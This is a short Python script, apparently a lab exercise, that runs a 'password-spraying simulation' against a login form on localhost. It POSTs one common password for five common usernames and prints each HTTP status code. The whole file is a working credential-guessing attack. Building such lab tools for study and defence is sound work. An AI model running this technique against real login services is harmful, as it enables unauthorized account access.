import requests
import time

URL = "http://127.0.0.1:5000/login"

users = [
    "admin",
    "root",
    "test",
    "guest",
    "user"
]

password = "Password123!"

print("[*] Starting password-spraying simulation...")
print(f"[*] Testing password: {password}")

for username in users:
    data = {
        "username": username,
        "password": password
    }

    try:
        response = requests.post(URL, data=data, timeout=5)

        print(f"[*] {username}:{password} -> HTTP {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Connection error: {e}")

    time.sleep(2)

print("[+] Password-spraying simulation completed.")
